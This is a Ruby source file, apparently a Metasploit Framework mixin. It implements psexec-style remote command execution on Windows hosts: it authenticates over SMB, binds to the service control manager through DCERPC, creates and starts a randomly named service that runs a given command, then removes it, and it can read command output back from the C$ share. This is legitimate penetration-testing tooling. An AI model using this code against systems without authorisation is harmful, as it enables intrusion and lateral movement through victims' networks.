# -*- coding: binary -*-

module Msf

####
# Allows for reuse of the psexec code execution technique
#
# This code was stolen straight out of the psexec module. Thanks very
# much for all who contributed to that module!! Instead of uploading
# and running a binary.
####

module Exploit::Remote::SMB::Psexec

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Authenticated

  ERROR_SUCCESS = 0x0
  ERROR_FILE_NOT_FOUND = 0x2
  ERROR_SERVICE_EXISTS = 0x431
  NULL_HANDLE = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

  def initialize(info = {})
    super
    register_options(
      [
        OptString.new('SERVICE_NAME', [ false, 'The service name', nil]),
        OptString.new('SERVICE_DISPLAY_NAME', [ false, 'The service display name', nil]),
      ], self.class)
  end

  def service_name
    @service_name ||= datastore['SERVICE_NAME']
    @service_name ||= rand_text_alpha(8)
  end

  def display_name
    @display_name ||= datastore['SERVICE_DISPLAY_NAME']
    @display_name ||= rand_text_alpha(16)
  end

  #
  # @param smbshare [String] The SMBshare to connect to.  Usually C$
  # @param host [String] Remote host to connect to, as an IP address or
  #   hostname
  # @param file [String] Path to the output file relative to the smbshare
  #   Example: '\WINDOWS\Temp\outputfile.txt'
  # @return [String,nil] output or nil on failure
  def smb_read_file(smbshare, host, file)
    begin
      simple.connect("\\\\#{host}\\#{smbshare}")
      file = simple.open(file, 'ro')
      contents = file.read
      file.close
      simple.disconnect("\\\\#{host}\\#{smbshare}")
      return contents
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      print_error("#{peer} - Unable to read file #{file}. #{e.class}: #{e}.")
      return nil
    end
  end

  def open_service_manager
    scm_handle = nil

    stubdata = NDR.uwstring("\\\\#{rhost}") + NDR.long(0) + NDR.long(0xF003F)
    begin
      response = dcerpc.call(0x0f, stubdata)
      if response
        scm_handle = response[0,20]
      end
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error("#{peer} - Error getting scm handle: #{e}")
    end

    scm_handle
  end

  def create_service(scm_handle, command)
    svc_handle = nil
    svc_status = nil

    stubdata =
      scm_handle + NDR.wstring(service_name) + NDR.uwstring(display_name) +
      NDR.long(0x0F01FF) + # Access: MAX
      NDR.long(0x00000110) + # Type: Interactive, Own process
      NDR.long(0x00000003) + # Start: Demand
      NDR.long(0x00000000) + # Errors: Ignore
      NDR.wstring( command ) +
      NDR.long(0) + # LoadOrderGroup
      NDR.long(0) + # Dependencies
      NDR.long(0) + # Service Start
      NDR.long(0) + # Password
      NDR.long(0) + # Password
      NDR.long(0) + # Password
      NDR.long(0) # Password
    begin
      response = dcerpc.call(0x0c, stubdata)
      if response
        svc_handle = response[4,20]
        svc_status = response[24,4].unpack('V').first
      end
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error("#{peer} - Error creating service: #{e}")
    end

    return svc_handle, svc_status
  end

  def open_service_handle(scm_handle)
    svc_handle = nil
    begin
      stubdata = scm_handle + NDR.wstring(service_name) + NDR.long(0xF01FF)
      response = dcerpc.call(0x10, stubdata)
      if response
        svc_handle = response[0,20]
      end
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error("#{peer} - Error opening service: #{e}")
    end

    svc_handle
  end

  def start_service(svc_handle)
    svc_status = nil
    stubdata = svc_handle + NDR.long(0) + NDR.long(0)
    begin
      response = dcerpc.call(0x13, stubdata)
      if response
        svc_status = response.unpack('V').first
      end
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error("#{peer} - Error starting service: #{e}")
    end

    svc_status
  end

  def remove_service(svc_handle)
    svc_status = nil
    begin
      response = dcerpc.call(0x02, svc_handle)
      if response
        svc_status = response.unpack('V').first
      end
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error("#{peer} - Error removing service: #{e}")
    end

    svc_status
  end

  def close_service_handle(svc_handle)
    svc_status = nil
    begin
      response = dcerpc.call(0x0, svc_handle)
      svc_status = response.unpack('V').first
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error("#{peer} - Error closing service handle: #{e}")
    end

    svc_status
  end

  # Executes a single windows command.
  #
  # If you want to retrieve the output of your command you'll have to
  # echo it to a .txt file and then use the {#smb_read_file} method to
  # retrieve it.  Make sure to remove the files manually or use
  # {Exploit::FileDropper#register_files_for_cleanup} to have the
  # {Exploit::FileDropper#cleanup} and
  # {Exploit::FileDropper#on_new_session} handlers do it for you.
  #
  # @param command [String] Should be a valid windows command
  # @param disconnect [Boolean] Disconnect afterwards
  # @return [Boolean] Whether everything went well
  def psexec(command, disconnect=true)
    simple.connect("\\\\#{datastore['RHOST']}\\IPC$")
    handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
    vprint_status("#{peer} - Binding to #{handle} ...")
    dcerpc_bind(handle)
    vprint_status("#{peer} - Bound to #{handle} ...")
    vprint_status("#{peer} - Obtaining a service manager handle...")

    scm_handle = open_service_manager

    return false unless scm_handle

    vprint_status("#{peer} - Creating the service...")
    svc_handle, svc_status = create_service(scm_handle, command)

    return false unless svc_handle && svc_status

    case svc_status
    when ERROR_SUCCESS
      vprint_good("#{peer} - Successfully created the service")
    when ERROR_SERVICE_EXISTS
      service_exists = true
      print_warning("#{peer} - Service already exists, opening a handle...")
      svc_handle = open_service_handle(scm_handle)
    else
      print_error("#{peer} - Failed to create service, ERROR_CODE: #{svc_status}")
      return false
    end

    return false unless svc_handle

    if svc_handle == NULL_HANDLE
      print_error("#{peer} - No service handle retrieved")
      return false
    else
      vprint_status("#{peer} - Starting the service...")
      begin
        svc_status = start_service(svc_handle)
        case svc_status
        when ERROR_SUCCESS
          print_good("#{peer} - Service started successfully...")
        when ERROR_FILE_NOT_FOUND
          print_error("#{peer} - Service failed to start - FILE_NOT_FOUND")
        else
          print_error("#{peer} - Service failed to start, ERROR_CODE: #{svc_status}")
        end
      ensure
        begin
          # If service already exists don't delete it!
          # Maybe we could have a force cleanup option..?
          if service_exists
            print_warning("#{peer} - Not removing service as it already existed...")
          else
            vprint_status("#{peer} - Removing the service...")
            svc_status = remove_service(svc_handle)
            if svc_status == ERROR_SUCCESS
              vprint_good("#{peer} - Successfully removed the sevice")
            else
              print_error("#{peer} - Unable to remove the service, ERROR_CODE: #{svc_status}")
            end
          end
        ensure
          vprint_status("#{peer} - Closing service handle...")
          close_service_handle(svc_handle)
        end
      end
    end

    if disconnect
      sleep(1)
      simple.disconnect("\\\\#{datastore['RHOST']}\\IPC$")
    end

    true
  end

  def peer
    "#{rhost}:#{rport}"
  end

end

end
